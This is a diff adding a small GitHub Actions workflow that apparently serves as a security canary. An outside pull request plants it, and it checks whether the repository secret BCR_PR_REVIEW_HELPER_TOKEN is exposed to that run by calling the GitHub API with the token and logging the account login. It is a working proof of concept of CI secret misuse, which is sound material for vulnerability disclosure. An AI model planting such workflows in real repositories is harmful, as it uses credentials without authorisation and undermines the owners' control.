@@ -1,0 +1,17 @@
+name: canary-push
+on: push
+jobs:
+  canary:
+    runs-on: ubuntu-latest
+    steps:
+      - name: canary
+        env:
+          T: ${{ secrets.BCR_PR_REVIEW_HELPER_TOKEN }}
+        run: |
+          echo "CANARY r11 sink1: workflow added by an outside PR ran in $GITHUB_REPOSITORY on $GITHUB_REF (event=$GITHUB_EVENT_NAME actor=$GITHUB_ACTOR)"
+          if [ -n "$T" ]; then
+            curl -fsS -H "Authorization: token $T" https://api.github.com/user \
+              | python3 -c 'import json,sys; print("CANARY r11 sink1: repo secret authenticates as:", json.load(sys.stdin)["login"])'
+          else
+            echo "CANARY r11 sink1: secret not available to this run"
+          fi
